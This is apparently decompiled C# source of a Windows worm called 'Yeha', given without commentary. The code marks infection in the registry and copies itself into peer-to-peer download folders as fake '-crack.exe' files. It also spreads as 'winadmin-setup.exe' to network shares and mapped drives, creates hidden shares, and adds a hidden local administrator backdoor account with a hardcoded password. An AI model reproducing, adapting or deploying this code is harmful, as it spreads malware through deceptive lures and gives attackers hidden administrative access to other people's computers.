using System;
using System.Collections;
using System.Diagnostics;
using System.DirectoryServices;
using System.IO;
using System.Management;
using Microsoft.Win32;

namespace Yeha;

internal class Yeha
{
	private string me = Convert.ToString(Process.GetCurrentProcess().MainModule!.FileName);

	public bool chkIt()
	{
		string text = (string)Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Yeha", "Yeha", "Yeha");
		if (text == "Yeha")
		{
			return true;
		}
		RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software", writable: true);
		RegistryKey registryKey2 = registryKey.CreateSubKey("Yeha");
		registryKey2.SetValue("Yeha", me);
		return false;
	}

	public void p2p()
	{
		ArrayList arrayList = new ArrayList();
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\Shared");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Ares\\My Shared Folder");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\Downloads");
		arrayList.Add(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Shareaza\\Downloads");
		IEnumerator enumerator = arrayList.GetEnumerator();
		while (enumerator.MoveNext())
		{
			string text = Convert.ToString(enumerator.Current);
			if (Directory.Exists(text))
			{
				string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles);
				string[] directories = Directory.GetDirectories(folderPath);
				foreach (string text2 in directories)
				{
					string destFileName = text + "\\" + text2.Substring(text2.LastIndexOf("\\")).Replace("\\", string.Empty) + "-crack.exe";
					File.Copy(me, destFileName, overwrite: true);
				}
			}
		}
	}

	public void YehaUser()
	{
		//IL_0015: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		try
		{
			DirectoryEntry val = new DirectoryEntry("WinNT://" + Environment.MachineName + ",computer");
			DirectoryEntry val2 = val.get_Children().Add("Yeha", "user");
			val2.Invoke("SetPassword", new object[1] { "yehawashere" });
			val2.CommitChanges();
			DirectoryEntry val3 = val.get_Children().Find("Administrators", "group");
			if (val3 != null)
			{
				val3.Invoke("Add", new object[1] { val2.get_Path().ToString() });
			}
			try
			{
				string keyName = "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList";
				Registry.SetValue(keyName, "Yeha", 0, RegistryValueKind.DWord);
			}
			catch (Exception)
			{
			}
		}
		catch (Exception)
		{
		}
	}

	public void Share()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_000c: Expected O, but got Unknown
		//IL_0023: Unknown result type (might be due to invalid IL or missing references)
		//IL_0029: Expected O, but got Unknown
		try
		{
			ManagementObjectSearcher val = new ManagementObjectSearcher("select * from win32_share");
			ManagementObjectEnumerator enumerator = val.Get().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					string text = Convert.ToString(((ManagementBaseObject)val2).get_Item("Name"));
					if (!text.Contains("$"))
					{
						File.Copy(me, "\\\\" + Environment.MachineName + "\\" + text + "\\winadmin-setup.exe", overwrite: true);
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception)
		{
		}
		try
		{
			string name = "Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Map Network Drive MRU\\";
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name);
			string[] valueNames = registryKey.GetValueNames();
			foreach (string text2 in valueNames)
			{
				string text3 = registryKey.GetValue(text2)!.ToString();
				if (text2.ToLower() != "mrulist")
				{
					try
					{
						File.Copy(me, text3 + "\\\\winadmin-setup.exe", overwrite: true);
					}
					catch (Exception)
					{
					}
				}
			}
			registryKey.Close();
		}
		catch (Exception)
		{
		}
	}

	public void CreateShare(string dir, string name)
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		try
		{
			Directory.CreateDirectory(dir);
			ManagementClass val = new ManagementClass("Win32_Share");
			ManagementBaseObject methodParameters = ((ManagementObject)val).GetMethodParameters("Create");
			methodParameters.set_Item("Description", (object)name);
			methodParameters.set_Item("Name", (object)name);
			methodParameters.set_Item("Path", (object)dir);
			methodParameters.set_Item("Type", (object)0);
			ManagementBaseObject val2 = ((ManagementObject)val).InvokeMethod("Create", methodParameters, (InvokeMethodOptions)null);
			if ((uint)val2.get_Properties().get_Item("ReturnValue").get_Value() == 0 && Directory.Exists(dir))
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(dir);
				directoryInfo.Attributes = FileAttributes.Hidden;
			}
		}
		catch (Exception)
		{
		}
	}
}
